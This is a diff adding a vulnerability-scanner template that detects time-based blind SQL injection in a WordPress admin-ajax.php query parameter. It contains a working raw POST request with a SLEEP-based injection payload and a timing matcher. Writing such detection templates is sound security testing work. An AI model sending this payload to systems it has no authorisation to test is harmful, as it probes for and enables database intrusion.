@@ -1,0 +1,26 @@
+id: wordpress-sqli-query-param
+
+info:
+  name: WordPress SQL Injection in Query Parameter
+  author: 3th1c_yuk1
+  severity: critical
+  description: |
+    Detects SQL Injection vulnerability in WordPress admin-ajax.php endpoint query parameter.
+    The vulnerability can be exploited using time-based blind SQL injection payloads.
+  reference:
+    - https://medium.com/@zhenwarx/sql-injection-vulnerability-in-microsofts-devblogs-devblogs-microsoft-com-690792213d1f
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=load_more_results2&limit=10&offset=10&query=HELLO(SELECT+4008+FROM+(SELECT(SLEEP(5)))LDNk)&search_term=the
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration > 5
